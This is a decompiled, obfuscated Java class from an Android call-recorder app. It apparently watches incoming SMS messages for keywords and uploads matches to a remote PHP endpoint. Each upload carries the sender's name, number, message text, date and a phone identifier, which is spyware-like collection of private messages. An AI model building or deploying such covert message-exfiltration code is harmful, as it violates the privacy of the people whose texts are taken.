package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.a;
import a.c.b.I;
import a.c.b.h0;
import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import com.crashlytics.android.Crashlytics;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

/* compiled from: SMSAlertSend */
public class k extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f241a;

    /* renamed from: b reason: collision with root package name */
    private final String f242b;

    /* renamed from: c reason: collision with root package name */
    private final String f243c;

    /* renamed from: d reason: collision with root package name */
    private final int f244d;

    public k(Context context, String str, String str2, int i) {
        this.f241a = context;
        this.f242b = str;
        this.f243c = str2;
        this.f244d = i;
    }

    /* JADX WARNING: No exception handlers in catch block: Catch:{  } */
    public void run() {
        long j;
        String str = "";
        try {
            String a2 = a.a(this.f243c);
            if (a2 != null) {
                String format = c.d().format(new Date());
                String a3 = c.a(this.f241a, this.f242b);
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append(str);
                sb.append(e.e(this.f241a));
                hashMap.put("idPhone", sb.toString());
                hashMap.put("name", a3);
                hashMap.put("number", this.f242b);
                hashMap.put("message", this.f243c);
                StringBuilder sb2 = new StringBuilder();
                sb2.append(str);
                sb2.append(this.f244d);
                hashMap.put("type", sb2.toString());
                hashMap.put("date", format);
                hashMap.put("keyword", a2);
                StringBuilder sb3 = new StringBuilder();
                sb3.append(str);
                sb3.append(a3);
                String sb4 = sb3.toString();
                StringBuilder sb5 = new StringBuilder();
                sb5.append(str);
                sb5.append(this.f242b);
                String sb6 = sb5.toString();
                StringBuilder sb7 = new StringBuilder();
                sb7.append(str);
                sb7.append(this.f243c);
                String sb8 = sb7.toString();
                int i = this.f244d;
                StringBuilder sb9 = new StringBuilder();
                sb9.append(str);
                sb9.append(format);
                String sb10 = sb9.toString();
                StringBuilder sb11 = new StringBuilder();
                sb11.append(str);
                sb11.append(a2);
                String sb12 = sb11.toString();
                try {
                    h0 h0Var = new h0(this.f241a);
                    I i2 = new I(sb4, sb6, sb8, i, sb10, sb12);
                    h0Var.b();
                    j = h0Var.a(i2);
                    h0Var.a();
                } catch (Exception e2) {
                    try {
                        e2.getStackTrace();
                        Crashlytics.logException(e2);
                    } catch (Exception unused) {
                    }
                    j = -1;
                }
                if (a.c.e.a.b("sms/insertSMSAlert.php", (Map<String, String>) hashMap)) {
                    int i3 = (int) j;
                    try {
                        h0 h0Var2 = new h0(this.f241a);
                        h0Var2.b();
                        h0Var2.a(i3);
                        h0Var2.a();
                    } catch (Exception e3) {
                        try {
                            e3.getStackTrace();
                            Crashlytics.logException(e3);
                        } catch (Exception unused2) {
                        }
                    }
                }
            }
        } catch (Throwable th) {
            th.getStackTrace();
            Crashlytics.logException(th);
        }
    }
}
